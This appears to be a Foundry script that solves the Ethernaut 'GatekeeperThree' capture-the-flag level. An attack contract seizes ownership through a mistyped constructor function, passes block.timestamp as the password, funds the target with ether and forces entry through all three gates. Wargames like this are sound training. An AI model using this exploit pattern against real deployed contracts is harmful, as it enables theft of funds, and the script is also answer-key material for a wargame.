// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import "../src/Level28.sol";

contract Level28Sol is Script {
    GatekeeperThree public instance = GatekeeperThree(payable(0x1B3158cc2634Fbf84299D79D52a2E63680B63559));
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Gate Owner : ", instance.owner());

        Attack attack = new Attack{value: 0.009 ether}();
        attack.exploit();
        
        console.log("Allow Entrance : ", instance.allowEntrance());
        console.log("Gate keeper Owner : ", instance.owner());
        console.log("Entrant : ", instance.entrant());
        vm.stopBroadcast();
    }
}

contract Attack { 
    GatekeeperThree public instance = GatekeeperThree(payable(0x1B3158cc2634Fbf84299D79D52a2E63680B63559));

    constructor() payable{}
    function exploit() public {

        instance.construct0r();//bypassed first gate

        //bypassing second gate
        instance.createTrick();
        
        // uint256 password = vm.getBlockTimestamp();
        instance.getAllowance(block.timestamp);

        (bool success, ) = payable(address(instance)).call{value : address(this).balance}("");
        require(success, "Transaction Failed");

        instance.enter();

    }
}